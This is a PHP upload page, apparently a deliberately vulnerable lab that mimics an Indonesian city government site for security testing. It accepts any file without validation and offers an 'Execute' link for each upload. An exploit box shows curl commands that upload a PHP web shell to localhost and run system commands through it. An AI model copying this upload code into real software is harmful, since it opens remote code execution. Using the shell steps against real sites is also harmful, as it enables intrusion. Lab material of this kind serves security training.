<?php
$upload_dir = 'uploads/';
$message = '';
$message_type = '';

// Ensure upload directory exists
if (!is_dir($upload_dir)) {
    mkdir($upload_dir, 0755, true);
}

// Process file upload
if ($_POST && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    
    if ($file['error'] === UPLOAD_ERR_OK) {
        $filename = $file['name'];
        $destination = $upload_dir . $filename;
        
        // VULNERABLE: No file type validation
        // VULNERABLE: No file size limit
        // VULNERABLE: No file content validation
        // VULNERABLE: Direct file execution possible
        
        if (move_uploaded_file($file['tmp_name'], $destination)) {
            $message = "File berhasil diupload: " . htmlspecialchars($filename);
            $message_type = 'success';
        } else {
            $message = "Gagal mengupload file: " . htmlspecialchars($filename);
            $message_type = 'danger';
        }
    } else {
        $message = "Error dalam upload file: " . $file['error'];
        $message_type = 'danger';
    }
}

// Get list of uploaded files
$uploaded_files = [];
if (is_dir($upload_dir)) {
    $files = scandir($upload_dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $file_path = $upload_dir . $file;
            $uploaded_files[] = [
                'name' => $file,
                'size' => filesize($file_path),
                'date' => filemtime($file_path),
                'type' => mime_content_type($file_path)
            ];
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload File - Pemerintah Kota XX</title>
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-color: #1e3a8a;
            --secondary-color: #3b82f6;
            --accent-color: #f59e0b;
            --success-color: #10b981;
            --warning-color: #f59e0b;
            --danger-color: #ef4444;
            --light-color: #f8fafc;
            --dark-color: #1e293b;
            --text-primary: #1e293b;
            --text-secondary: #64748b;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--light-color);
            color: var(--text-primary);
        }

        .navbar {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
        }

        .main-content {
            padding: 40px 0;
        }

        .card {
            border: none;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            margin-bottom: 30px;
        }

        .card-header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            border-radius: 20px 20px 0 0 !important;
            border: none;
            padding: 25px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border: none;
            border-radius: 15px;
            padding: 15px 30px;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
        }

        .form-control {
            border: 2px solid #e2e8f0;
            border-radius: 15px;
            padding: 15px 20px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .form-control:focus {
            border-color: var(--secondary-color);
            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
        }

        .file-upload-area {
            border: 3px dashed var(--secondary-color);
            border-radius: 20px;
            padding: 50px;
            text-align: center;
            background: #f8fafc;
            transition: all 0.3s ease;
            margin: 20px 0;
        }

        .file-upload-area:hover {
            background: #e2e8f0;
            border-color: var(--primary-color);
            transform: scale(1.02);
        }

        .vulnerability-warning {
            background: linear-gradient(135deg, var(--warning-color), #f97316);
            color: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .table {
            border-radius: 15px;
            overflow: hidden;
        }

        .table thead th {
            background: var(--light-color);
            border: none;
            font-weight: 600;
            color: var(--primary-color);
            padding: 20px;
        }

        .table tbody td {
            padding: 15px 20px;
            vertical-align: middle;
        }

        .stats-card {
            background: linear-gradient(135deg, var(--success-color), #059669);
            color: white;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            margin-bottom: 30px;
        }

        .stats-number {
            font-size: 3rem;
            font-weight: 700;
            margin-bottom: 15px;
        }

        .exploit-examples {
            background: var(--dark-color);
            color: white;
            border-radius: 15px;
            padding: 25px;
            margin-top: 20px;
        }

        .exploit-examples code {
            background: #374151;
            color: #10b981;
            padding: 8px 12px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            display: block;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">
                <i class="fas fa-landmark"></i> Pemerintah Kota XX
            </a>
            <div class="navbar-nav ms-auto">
                <a class="nav-link" href="index.php">
                    <i class="fas fa-home"></i> Beranda
                </a>
                <a class="nav-link" href="upload.php">
                    <i class="fas fa-upload"></i> Upload
                </a>
                <a class="nav-link" href="admin/">
                    <i class="fas fa-user-shield"></i> Admin
                </a>
            </div>
        </div>
    </nav>

    <div class="main-content">
        <div class="container">
            <!-- Vulnerability Warning -->
            <div class="vulnerability-warning">
                <h4><i class="fas fa-exclamation-triangle"></i> PERINGATAN KEAMANAN</h4>
                <p class="mb-0">Halaman upload ini sengaja dibuat vulnerable untuk testing keamanan. JANGAN gunakan di lingkungan produksi!</p>
            </div>

            <!-- Stats Cards -->
            <div class="row mb-4">
                <div class="col-md-4">
                    <div class="stats-card">
                        <div class="stats-number"><?php echo count($uploaded_files); ?></div>
                        <div>Total Files Uploaded</div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="stats-card" style="background: linear-gradient(135deg, var(--warning-color), #f97316);">
                        <div class="stats-number">5+</div>
                        <div>Security Vulnerabilities</div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="stats-card" style="background: linear-gradient(135deg, var(--danger-color), #dc2626);">
                        <div class="stats-number">Critical</div>
                        <div>Risk Level</div>
                    </div>
                </div>
            </div>

            <!-- File Upload Section -->
            <div class="card">
                <div class="card-header">
                    <h3 class="mb-0">
                        <i class="fas fa-cloud-upload-alt"></i> Upload File
                    </h3>
                    <p class="mb-0 mt-2">Upload file ke server pemerintah kota</p>
                </div>
                <div class="card-body">
                    <?php if ($message): ?>
                        <div class="alert alert-<?php echo $message_type; ?> alert-dismissible fade show">
                            <i class="fas fa-info-circle"></i>
                            <?php echo $message; ?>
                            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
                        </div>
                    <?php endif; ?>

                    <div class="file-upload-area">
                        <form method="POST" enctype="multipart/form-data">
                            <i class="fas fa-cloud-upload-alt fa-4x text-primary mb-4"></i>
                            <h4>Upload File Baru</h4>
                            <p class="text-muted mb-4">Pilih file yang ingin diupload ke server pemerintah kota</p>
                            
                            <div class="mb-4">
                                <input type="file" 
                                       class="form-control form-control-lg" 
                                       name="file" 
                                       required>
                            </div>
                            
                            <button type="submit" class="btn btn-primary btn-lg">
                                <i class="fas fa-upload"></i> Upload File
                            </button>
                        </form>
                    </div>

                    <div class="mt-4">
                        <h6><i class="fas fa-info-circle"></i> Informasi Upload:</h6>
                        <ul class="text-muted">
                            <li>File akan disimpan di direktori: <code><?php echo htmlspecialchars($upload_dir); ?></code></li>
                            <li>Tidak ada validasi tipe file (VULNERABLE)</li>
                            <li>Tidak ada batasan ukuran file (VULNERABLE)</li>
                            <li>File dapat dieksekusi langsung (VULNERABLE)</li>
                            <li>Tidak ada scanning malware (VULNERABLE)</li>
                        </ul>
                    </div>
                </div>
            </div>

            <!-- Files List Section -->
            <div class="card">
                <div class="card-header">
                    <h3 class="mb-0">
                        <i class="fas fa-folder-open"></i> File yang Sudah Diupload
                    </h3>
                    <p class="mb-0 mt-2">Daftar semua file yang telah diupload ke server</p>
                </div>
                <div class="card-body">
                    <?php if (empty($uploaded_files)): ?>
                        <div class="text-center text-muted py-5">
                            <i class="fas fa-folder-open fa-4x mb-4"></i>
                            <h5>Belum ada file yang diupload</h5>
                            <p>Upload file pertama Anda menggunakan form di atas</p>
                        </div>
                    <?php else: ?>
                        <div class="table-responsive">
                            <table class="table table-hover">
                                <thead>
                                    <tr>
                                        <th>Nama File</th>
                                        <th>Ukuran</th>
                                        <th>Tipe File</th>
                                        <th>Tanggal Upload</th>
                                        <th>Aksi</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($uploaded_files as $file): ?>
                                        <tr>
                                            <td>
                                                <i class="fas fa-file"></i>
                                                <strong><?php echo htmlspecialchars($file['name']); ?></strong>
                                            </td>
                                            <td>
                                                <span class="badge bg-info">
                                                    <?php echo number_format($file['size'] / 1024, 2); ?> KB
                                                </span>
                                            </td>
                                            <td>
                                                <span class="badge bg-secondary">
                                                    <?php echo htmlspecialchars($file['type']); ?>
                                                </span>
                                            </td>
                                            <td>
                                                <i class="fas fa-calendar"></i>
                                                <?php echo date('d/m/Y H:i', $file['date']); ?>
                                            </td>
                                            <td>
                                                <div class="btn-group" role="group">
                                                    <a href="<?php echo $upload_dir . urlencode($file['name']); ?>" 
                                                       class="btn btn-sm btn-outline-primary"
                                                       target="_blank">
                                                        <i class="fas fa-eye"></i> View
                                                    </a>
                                                    <a href="<?php echo $upload_dir . urlencode($file['name']); ?>" 
                                                       class="btn btn-sm btn-outline-success"
                                                       download>
                                                        <i class="fas fa-download"></i> Download
                                                    </a>
                                                    <a href="<?php echo $upload_dir . urlencode($file['name']); ?>" 
                                                       class="btn btn-sm btn-outline-warning"
                                                       target="_blank">
                                                        <i class="fas fa-play"></i> Execute
                                                    </a>
                                                </div>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    <?php endif; ?>
                </div>
            </div>

            <!-- Security Information -->
            <div class="card">
                <div class="card-header">
                    <h3 class="mb-0">
                        <i class="fas fa-shield-alt"></i> Informasi Keamanan
                    </h3>
                    <p class="mb-0 mt-2">Daftar kerentanan yang ada di sistem ini</p>
                </div>
                <div class="card-body">
                    <div class="row">
                        <div class="col-md-6">
                            <div class="alert alert-danger">
                                <h6><i class="fas fa-times-circle"></i> Unrestricted File Upload</h6>
                                <p class="mb-0">Tidak ada validasi tipe file, ukuran, atau konten file</p>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="alert alert-danger">
                                <h6><i class="fas fa-times-circle"></i> File Execution</h6>
                                <p class="mb-0">File yang diupload dapat dieksekusi langsung oleh web server</p>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="alert alert-warning">
                                <h6><i class="fas fa-exclamation-triangle"></i> No Malware Scanning</h6>
                                <p class="mb-0">Tidak ada scanning malware untuk file yang diupload</p>
                            </div>
                        </div>
                        <div class="col-md-6">
                            <div class="alert alert-warning">
                                <h6><i class="fas fa-exclamation-triangle"></i> Directory Listing</h6>
                                <p class="mb-0">Struktur direktori dapat dilihat oleh publik</p>
                            </div>
                        </div>
                    </div>

                    <div class="exploit-examples">
                        <h6><i class="fas fa-code"></i> Contoh Exploit dan Testing:</h6>
                        <code>
# Upload PHP shell<br>
curl -X POST -F "file=@shell.php" http://localhost:8080/upload.php<br><br>

# Execute system commands<br>
curl "http://localhost:8080/uploads/shell.php?cmd=whoami"<br>
curl "http://localhost:8080/uploads/shell.php?cmd=ls -la"<br>
curl "http://localhost:8080/uploads/shell.php?cmd=pwd"<br><br>

# Test file access<br>
curl "http://localhost:8080/uploads/"<br>
curl "http://localhost:8080/uploads/.htaccess"
                        </code>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-dark text-light text-center py-4 mt-5">
        <div class="container">
            <p class="mb-0">
                <i class="fas fa-exclamation-triangle"></i> 
                Website ini dibuat untuk testing keamanan. JANGAN gunakan di lingkungan produksi!
            </p>
        </div>
    </footer>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
